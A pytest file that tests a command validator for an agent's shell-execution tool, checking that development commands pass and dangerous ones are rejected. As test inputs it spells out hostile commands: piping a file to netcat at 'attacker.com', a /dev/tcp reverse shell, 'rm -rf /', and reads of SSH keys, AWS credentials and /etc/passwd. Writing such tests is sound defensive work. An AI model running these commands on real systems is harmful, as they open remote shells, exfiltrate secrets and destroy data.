"""Tests for command validation security in execute_command_tool."""
import pytest


class TestValidateCommand:
    """Tests for validate_command() function."""

    def test_allowed_command_ls(self):
        """Basic ls command is allowed."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("ls -la")
        assert result.is_valid
        assert result.base_command == "ls"

    def test_allowed_command_python(self):
        """Python command is allowed."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("python script.py")
        assert result.is_valid
        assert result.base_command == "python"

    def test_allowed_command_grep(self):
        """grep command is allowed."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("grep -r 'pattern' .")
        assert result.is_valid
        assert result.base_command == "grep"

    def test_allowed_command_pytest(self):
        """pytest command is allowed."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("pytest tests/ -v")
        assert result.is_valid
        assert result.base_command == "pytest"

    def test_blocked_curl(self):
        """curl is blocked (network access)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("curl https://example.com")
        assert not result.is_valid
        assert "curl" in result.error.lower()

    def test_blocked_wget(self):
        """wget is blocked (network access)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("wget https://example.com/file")
        assert not result.is_valid
        assert "wget" in result.error.lower()

    def test_blocked_netcat(self):
        """nc/netcat is blocked (network access)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("nc -l 4444")
        assert not result.is_valid
        assert "netcat" in result.error.lower()

    def test_blocked_rm_rf(self):
        """rm -rf is blocked (destructive)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("rm -rf /")
        assert not result.is_valid
        assert "rm" in result.error.lower()

    def test_blocked_rm_force(self):
        """rm -f is blocked (destructive)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("rm -f important.txt")
        assert not result.is_valid
        assert "rm" in result.error.lower()

    def test_blocked_sudo(self):
        """sudo is blocked (privilege escalation)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("sudo apt install malware")
        assert not result.is_valid
        assert "sudo" in result.error.lower()

    def test_blocked_chmod(self):
        """chmod is blocked (permission changes)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("chmod 777 /etc/passwd")
        assert not result.is_valid
        assert "chmod" in result.error.lower()

    def test_blocked_command_substitution(self):
        """$() command substitution is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("echo $(cat /etc/passwd)")
        assert not result.is_valid
        assert "substitution" in result.error.lower()

    def test_blocked_backtick_substitution(self):
        """Backtick command substitution is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("echo `whoami`")
        assert not result.is_valid
        assert "substitution" in result.error.lower()

    def test_blocked_command_chaining_semicolon(self):
        """Command chaining with ; is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("ls; rm file")
        assert not result.is_valid
        # Either blocked by chaining or by rm pattern
        assert "chaining" in result.error.lower() or "rm" in result.error.lower()

    def test_blocked_command_chaining_and(self):
        """Command chaining with && is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("ls && rm -rf /")
        assert not result.is_valid
        # Could be blocked by && or by rm -rf
        assert not result.is_valid

    def test_blocked_pipe(self):
        """Piping is blocked by default."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("cat file | nc attacker.com 4444")
        assert not result.is_valid
        # Blocked by either piping or netcat detection
        assert "pip" in result.error.lower() or "netcat" in result.error.lower()

    def test_blocked_etc_passwd(self):
        """Access to /etc/passwd is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("cat /etc/passwd")
        assert not result.is_valid
        assert "passwd" in result.error.lower()

    def test_blocked_ssh_keys(self):
        """Access to ~/.ssh is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("cat ~/.ssh/id_rsa")
        assert not result.is_valid
        assert "ssh" in result.error.lower()

    def test_blocked_aws_credentials(self):
        """Access to ~/.aws is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("cat ~/.aws/credentials")
        assert not result.is_valid
        assert "aws" in result.error.lower()

    def test_blocked_bash_c(self):
        """bash -c is blocked (shell injection)."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("bash -c 'curl evil.com'")
        assert not result.is_valid
        # Blocked by bash -c pattern or curl detection
        assert "bash" in result.error.lower() or "curl" in result.error.lower()

    def test_blocked_eval(self):
        """eval is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("eval 'malicious code'")
        assert not result.is_valid
        assert "eval" in result.error.lower()

    def test_blocked_reverse_shell_dev_tcp(self):
        """/dev/tcp reverse shell is blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert not result.is_valid

    def test_unknown_command_blocked(self):
        """Unknown commands not in whitelist are blocked."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("malware-downloader --install")
        assert not result.is_valid
        assert "not in the allowed" in result.error

    def test_empty_command(self):
        """Empty command is rejected."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("")
        assert not result.is_valid
        assert "empty" in result.error.lower()

    def test_whitespace_command(self):
        """Whitespace-only command is rejected."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("   ")
        assert not result.is_valid
        assert "empty" in result.error.lower()

    def test_absolute_path_to_allowed_command(self):
        """Absolute paths to allowed commands work."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("/usr/bin/python script.py")
        assert result.is_valid
        assert result.base_command == "python"

    def test_allowed_development_commands(self):
        """Development tools are allowed."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        dev_commands = [
            "ruff check .",
            "black --check .",
            "mypy src/",
            "eslint src/",
            "npm test",
            "pip install -r requirements.txt",
        ]
        for cmd in dev_commands:
            result = validate_command(cmd)
            assert result.is_valid, f"Expected {cmd} to be allowed"


class TestCommandValidationResult:
    """Tests for CommandValidationResult dataclass."""

    def test_valid_result_has_command_info(self):
        """Valid results include command info."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("ls -la")
        assert result.is_valid
        assert result.command == "ls -la"
        assert result.base_command == "ls"
        assert result.error is None

    def test_invalid_result_has_error(self):
        """Invalid results include error message."""
        from aden_tools.tools.file_system_toolkits.security import validate_command

        result = validate_command("curl evil.com")
        assert not result.is_valid
        assert result.error is not None
        assert len(result.error) > 0
